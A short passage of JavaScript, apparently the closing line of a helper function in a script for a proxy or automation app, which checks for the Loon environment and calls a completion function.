this.isLoon()) && $done(t) } }(t, e) }
